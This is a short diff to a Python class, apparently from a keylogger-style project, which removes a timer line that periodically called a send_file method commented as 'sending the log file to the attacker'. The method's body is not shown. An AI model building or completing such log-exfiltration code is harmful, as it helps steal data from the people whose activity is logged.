@@ -18,7 +18,6 @@ class transfer:
         self.logFile = logFile
         self.size = os.path.getsize(self.logFile)
         print(' file size : {}'.format(str(self.size)))
-        threading.Timer(2, self.send_file).start()
 
     # sending the log file to the attacker
     def send_file(self):
